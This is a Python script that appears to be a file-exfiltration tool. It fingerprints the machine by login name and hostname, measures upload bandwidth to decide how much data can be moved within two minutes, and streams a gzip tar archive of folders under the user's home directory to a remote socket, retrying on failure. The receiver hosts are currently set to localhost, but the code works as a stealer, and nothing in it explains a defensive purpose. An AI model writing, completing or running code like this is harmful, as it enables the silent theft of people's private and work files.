import os
import socket
import tarfile
import time
from pathlib import Path
from typing import Iterable, List, Union
import speedtest
import time

from get_importent_files import get_importent_files_by_extansion, make_file_size_beauty, get_biggest, last_changed, get_importent_developer_files, get_folder_size

MAX_SECONDS = 120
MIN_SPEED_MBIT = 5

IMPORTANT_FILES = get_importent_files_by_extansion
PRETTY_FILES = make_file_size_beauty
BIGGEST_LOSER = get_biggest
LAST_CHANGED = last_changed
DEV_FILES = get_importent_developer_files
FOLDER_SIZE = get_folder_size

ALLOWED_EXTENSIONS = {".txt", ".pdf"}

SKIP_EXTANSIONS = {".mp4", ".mp3", ".png", ".jpeg"} # skip too big

HOST_1 = "127.0.0.1"
PORT_1 = 9001

HOST_2 = "127.0.0.1"
PORT_2 = 9000


def measure_upload_mbit() -> float:
    s = speedtest.Speedtest()
    s.get_best_server()
    upload_bps = s.upload()
    return upload_bps / 1_000_000  # bit/s -> Mbit/s


def get_transfer_amount(upload_speed_mbit: float) -> int:
    if upload_speed_mbit < MIN_SPEED_MBIT:
        return 100 * 1024 * 1024  # 100 MB fallback

    bytes_per_second = (upload_speed_mbit * 1_000_000) / 8
    return int(bytes_per_second * MAX_SECONDS)


def retry(func, retries: int = 5, delay: float = 1.0, *args, **kwargs):
    last_err = None

    for i in range(retries):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            last_err = e
            time.sleep(delay)

    raise last_err


def send_string(host: str, port: int, data: str):
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(data.encode())


def send_tar_stream(host: str, port: int, paths: List[Path]):
    with socket.create_connection((host, port), timeout=10) as s:
        fileobj = s.makefile("wb")

        with tarfile.open(fileobj=fileobj, mode="w:gz") as tar:
            for p in paths:
                p = Path(p)

                if p.is_file():
                    tar.add(p, arcname=p.name)

                elif p.is_dir():
                    for f in p.rglob("*"):
                        if f.is_file():
                            arc = f.relative_to(p.parent)
                            tar.add(f, arcname=str(arc))


def send_filename(filename: str):
    retry(send_string, 5, 1, HOST_1, PORT_1, filename)


def send_files(paths: Iterable[Union[str, Path]]):
    clean_paths = [Path(p) for p in paths]
    retry(send_tar_stream, 5, 1, HOST_2, PORT_2, clean_paths)


if __name__ == "__main__":
    USER_NAME = os.getlogin()
    HOST_NAME = os.uname().nodename
    DATE = time.strftime("%Y-%m-%d_%H-%M-%S")

    FILE_NAME = f"{USER_NAME}_{HOST_NAME}_{DATE}.tar.gz"

    send_filename(FILE_NAME)

    PATHS = [
        Path.home() / "Desktop" / "myapp"#,   
    ]

    time.sleep(2)

    send_files(PATHS)